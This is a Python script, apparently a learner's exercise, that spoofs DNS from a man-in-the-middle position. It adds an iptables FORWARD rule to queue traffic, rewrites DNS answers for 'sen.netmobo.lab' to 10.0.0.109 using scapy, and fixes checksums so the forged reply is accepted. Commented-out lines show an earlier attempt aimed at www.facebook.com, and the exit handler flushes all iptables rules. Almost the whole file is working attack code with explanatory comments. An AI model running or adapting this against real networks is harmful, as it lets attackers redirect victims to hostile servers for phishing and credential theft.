import netfilterqueue
#thre is pydivert for windows
import scapy.all as scapy

def process_packet(packet):
    #here we are converting the the original packet by creating a new packet
    #in scapy with the original packet
    #aka we remove netfilterqueue methods and add scapy methods to the original packet

        
        scapy_packet = scapy.IP(packet.get_payload())
        #if you want anytype of dns just write "DNS"
        #you want only Request DNS : scapy.DNSQR
        #you want only Response DNS : scapy.DNSRR
        
        if scapy_packet.haslayer(scapy.DNSRR):

            
            qname = scapy_packet[scapy.DNSQR].qname
            if "sen.netmobo.lab" in str(qname) : 
                print("yes its is")
                #note we also need to modify the number of answer packets
                #every dns packet have this counter (ancount) to tell the end host 
                #number of answer that he need to expect 
                #we will only send 1 response so we need to change it to 1 
                rr_dns_packet = scapy.DNSRR(rrname=qname,rdata="10.0.0.109")
                scapy_packet[scapy.DNS].an = rr_dns_packet
                scapy_packet[scapy.DNS].ancount = 1
                

                

                
                #The second problem is our modified answer won't have the same len
                #and checksum of the old packet that we are using, when the end host
                #will calculate the checksum it will be different than what was writting
                #in the original packet
                #all we need to is delete those fields in the old packet that we are using
                #as base of our new packet, so scapy will re calculate len and checksum
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                
                #then we change the payload on the packet that we got 
                #from the netfilterqueue to scapy packet and then accepting it
                print(scapy_packet.show())
                packet.set_payload(bytes(scapy_packet))
                # packet.accept()
            # print(qname)
            
            # qname = str(scapy_packet[scapy.DNSRR].qname )
            # if "www.facebook.com" in qname :
            # print(scapy_packet.show()) 
                # answer = scapy.DNSRR(rrname=qname, rdata="10.0.0.15")
                # scapy_packet[scapy.DNSRR] 
                # packet.drop()
            # else : 
            #     packet.accept()
        
        packet.accept()
        #     print("[+] DNS REQUEST !!")
        #     print(scapy_packet[scapy.DNSQR].show())
        # if scapy_packet.haslayer(scapy.DNSRR) : 
        #     print("[+] DNS Response !!")
        #     print(scapy_packet[scapy.DNSRR].show())    
            
        # packet.accept()
        
        # if scapy_packet.haslayer("TCP") and scapy_packet["TCP"].dport == 443 :
        #     print(scapy_packet.show())
        #packet.accept() => to allow packet to get forwarded
        #packet.drop() => allow the packet to read to there destination
        """ITS NO a SCAPY PACKET"""    
        # if packet.haslayer("HTTPRequest"):
        #     print(packet["HTTPRequests"].Path)
        pass

def createQueue():
    import subprocess
    # subprocess.Popen("iptables -A OUTPUT -j NFQUEUE --queue-num 0 ;  iptables -A INPUT -j NFQUEUE --queue-num 0",shell=True)
    subprocess.Popen("iptables -A FORWARD -j NFQUEUE --queue-num 0",shell=True)
    
def deleteQueue():
    import subprocess
    subprocess.Popen("iptables --flush",shell=True)
    
    
createQueue()
queue = netfilterqueue.NetfilterQueue()
#we binding the netfilterqueue object to our queue that we created (0)
queue.bind(0,process_packet)

try : 
    queue.run()
except KeyboardInterrupt : 
    print("Flushing the iptables ...")
    deleteQueue()















